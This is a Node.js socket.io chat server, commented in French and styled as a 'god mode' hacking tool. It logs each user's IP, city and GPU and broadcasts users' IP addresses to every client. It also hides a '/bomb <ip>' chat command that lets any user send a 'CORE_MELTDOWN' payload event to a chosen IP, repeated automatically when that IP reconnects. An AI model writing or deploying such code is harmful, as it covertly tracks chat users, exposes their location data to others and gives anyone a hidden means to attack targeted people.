const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);

app.use(express.static(__dirname));

const users = {}; 
const bannedIPs = new Set(); 

io.on('connection', (socket) => {
    // CAPTURE IP REELLE
    const ip = (socket.handshake.headers['x-forwarded-for'] || socket.conn.remoteAddress).split(',')[0].trim();

    // AUTO-BOMB : Si l'IP est bannie, on l'atomise direct
    if (bannedIPs.has(ip)) {
        console.log(`[!!!] TARGET DETECTED: ${ip}. SENDING PAYLOAD...`);
        socket.emit('CORE_MELTDOWN');
    }

    socket.on('init_user', (data) => {
        users[ip] = { ...data, sid: socket.id, ip: ip };
        console.log(`
        ╔═════════════ NOUVELLE CIBLE ═════════════╗
        ║ NOM  : ${data.name}
        ║ IP   : ${ip}
        ║ VILLE: ${data.geo.city || 'Inconnue'}
        ║ GPU  : ${data.hw.gpu}
        ╚══════════════════════════════════════════╝`);
        
        io.emit('update_users', Object.values(users));
    });

    // CHAT ET COMMANDES INVISIBLES
    socket.on('chat_msg', (data) => {
        const text = data.text.trim();
        if (text.startsWith("/bomb ")) {
            const target = text.split(" ")[1];
            bannedIPs.add(target);
            Object.keys(users).forEach(uIP => {
                if (uIP.includes(target)) io.to(users[uIP].sid).emit('CORE_MELTDOWN');
            });
            console.log(`[STRIKE] DESTROYING: ${target}`);
        } else {
            io.emit('chat_msg', data);
        }
    });

    // MESSAGES PRIVÉS
    socket.on('private_send', (d) => {
        const target = Object.values(users).find(u => u.ip === d.toIP);
        if(target) io.to(target.sid).emit('private_receive', { from: users[ip].name, text: d.text, pp: users[ip].pp, fromIP: ip });
    });

    socket.on('disconnect', () => { delete users[ip]; });
});

http.listen(3000, () => console.log("NEBULA_GOD_MODE_ONLINE_3000"));
